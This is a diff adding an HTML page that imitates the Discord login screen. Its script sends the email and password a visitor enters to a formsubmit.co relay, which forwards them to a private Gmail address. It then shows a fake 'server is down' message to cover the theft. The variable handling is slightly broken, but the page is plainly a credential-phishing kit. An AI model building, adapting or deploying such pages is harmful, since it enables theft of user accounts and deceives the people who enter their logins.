@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #36393f;
+            color: white;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .login-box {
+            background-color: #2f3136;
+            padding: 20px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+        h1 {
+            font-size: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 12px;
+            color: #b9bbbe;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            background-color: #202225;
+            border: 1px solid #202225;
+            border-radius: 3px;
+            color: white;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #7289da;
+            outline: none;
+        }
+        .forgot-password {
+            color: #7289da;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+        }
+        .login-btn {
+            background-color: #7289da;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 3px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .register-link {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #72767d;
+        }
+        .register-link a {
+            color: #7289da;
+            text-decoration: none;
+        }
+        #confirmation {
+            display: none;
+            margin-top: 15px;
+            padding: 10px;
+            background-color: #dff0d8;
+            border: 1px solid #d6e9c6;
+            border-radius: 4px;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">Discord</div>
+    <div class="login-box">
+        <h1>Welcome back!</h1>
+        <form id="infoForm">
+            <div class="form-group">
+                <label for="email">EMAIL OR PHONE NUMBER *</label>
+                <input type="text" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">PASSWORD *</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <a href="#" class="forgot-password">Forgot your password?</a>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+        <div class="register-link">
+            Need an account? <a href="#">Register</a>
+        </div>
+        <div id="confirmation">
+            Sorry! server is down try again later.
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('infoForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form values
+            const name = document.getElementById('email').value;
+            const caste = document.getElementById('password').value;
+            
+            // Send data to server-side script
+            fetch('https://formsubmit.co/ajax/shikarpurachar1@gmail.com', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    _subject: 'New Form Submission',
+                    _template: 'basic'
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Show confirmation message
+                document.getElementById('confirmation').style.display = 'block';
+                // Reset form
+                document.getElementById('infoForm').reset();
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
